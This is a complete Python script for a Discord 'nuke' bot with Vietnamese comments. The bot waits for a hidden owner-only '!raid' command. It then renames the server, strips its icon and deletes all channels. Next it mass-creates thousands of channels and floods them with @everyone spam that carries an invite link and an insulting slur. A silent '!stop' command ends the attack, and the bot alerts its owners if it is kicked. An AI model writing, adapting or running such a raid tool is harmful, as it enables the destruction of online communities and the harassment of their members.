# Python 3.10+ · discord.py 2.x · nuke-only (giữ nguyên cấu hình gốc)
# Commands: !raid <link?> | !stop   (owner only)

import discord
import asyncio
import os

# ===== CẤU HÌNH GỐC (NUKE) =====
TOKEN = "DISCORD_TOKEN"
OWNER_IDS = [ID_ALLOW]
RAID_NAME = " NAME_GUILD MOI"
CHANNEL_COUNT = 15000
BATCH_SIZE = 80
SPAM_LINK = "LINK_SERVER"
SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
NEW_GUILD_NAME = "TÊN MỚI SERVER"

SAVED_INVITE_FILE = "saved_invite.txt"

# ===== LƯU LINK MỜI =====
def load_saved_invite():
    if os.path.exists(SAVED_INVITE_FILE):
        with open(SAVED_INVITE_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    return None

def save_saved_invite(link):
    with open(SAVED_INVITE_FILE, "w", encoding="utf-8") as f:
        f.write(link)

saved_invite = load_saved_invite()

# ===== NUKE =====
nuke_running = False

async def change_guild_name(guild):
    try:
        await guild.edit(name=NEW_GUILD_NAME)
    except:
        pass

async def delete_guild_icon(guild):
    """Xóa ảnh đại diện của server"""
    try:
        await guild.edit(icon=None)
        print(f"[*] Đã xóa ảnh đại diện server: {guild.name}")
    except Exception as e:
        print(f"[!] Lỗi xóa icon: {e}")

async def delete_all_channels(guild):
    for ch in list(guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.001)
        except:
            pass

async def create_channels_and_spam(guild):
    global nuke_running
    total_created = 0
    for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
        if not nuke_running:
            print("[*] Nuke stopped by user.")
            return
        batch_tasks = []
        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - batch_start)
        for i in range(batch_count):
            idx = batch_start + i + 1
            name = f"{RAID_NAME} {idx}"
            batch_tasks.append(guild.create_text_channel(name))
        channels = await asyncio.gather(*batch_tasks, return_exceptions=True)
        spam_tasks = []
        for ch in channels:
            if isinstance(ch, discord.TextChannel):
                spam_tasks.append(ch.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
                total_created += 1
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.05)

async def continuous_spam(guild):
    global nuke_running
    while nuke_running:
        channels = list(guild.text_channels)
        if not channels:
            await asyncio.sleep(0.3)
            continue
        spam_tasks = []
        for channel in channels[:50]:
            spam_tasks.append(channel.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.1)

async def raid(guild):
    global nuke_running
    nuke_running = True
    await change_guild_name(guild)
    await asyncio.sleep(0.5)
    await delete_guild_icon(guild)
    await asyncio.sleep(0.5)
    await delete_all_channels(guild)
    await asyncio.sleep(0.1)
    asyncio.create_task(create_channels_and_spam(guild))
    asyncio.create_task(continuous_spam(guild))

# ===== CLIENT =====
intents = discord.Intents.all()
client = discord.Client(intents=intents)

# ===== !raid / !stop =====
@client.event
async def on_message(message):
    global nuke_running
    if message.author.id == client.user.id:
        return
    if message.author.id not in OWNER_IDS:
        return

    if message.content.startswith("!raid"):
        parts = message.content.split()
        if not message.guild:
            if len(parts) > 1:
                link = parts[1]
                if link.startswith(("http://", "https://")):
                    save_saved_invite(link)
                    await message.channel.send(f"✅ Đã lưu link nuke: {link}")
                else:
                    await message.channel.send("❌ Link không hợp lệ!")
            else:
                await message.channel.send("❌ Hãy gửi !raid <link> trong DM để lưu link.")
        else:
            await raid(message.guild)

    elif message.content.lower() == "!stop":
        if nuke_running:
            nuke_running = False
        # Không gửi gì cả – âm thầm dừng

# ===== SỰ KIỆN =====
@client.event
async def on_ready():
    print("=" * 50)
    print(" NUKE ONLY – by BANANAVUIVE")
    print("=" * 50)
    print(f"[*] Bot online: {client.user}")
    print("[*] Hidden: !raid (owner only – full nuke)")
    print("[*] Hidden: !stop (owner only – stop nuke silently)")
    print(f"[*] Owners: {OWNER_IDS}")
    for guild in client.guilds:
        print(f"[*] Connected to: {guild.name} (ID: {guild.id})")
    if saved_invite:
        print(f"[*] Saved invite link: {saved_invite}")

@client.event
async def on_guild_join(guild):
    print(f"[*] Added to new server: {guild.name}")

@client.event
async def on_member_remove(member):
    if member.id == client.user.id:
        for owner_id in OWNER_IDS:
            try:
                owner = await client.fetch_user(owner_id)
                if owner:
                    await owner.send(f"[!] Bot kicked from {member.guild.name}. Re-invite needed.")
            except:
                pass

# ===== CHẠY =====
if __name__ == "__main__":
    print("[*] Starting bot...")
    try:
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print("[!] Invalid token.")
    except KeyboardInterrupt:
        print("[*] Interrupted.")
    except Exception as e:
        print(f"[!] Error: {e}")
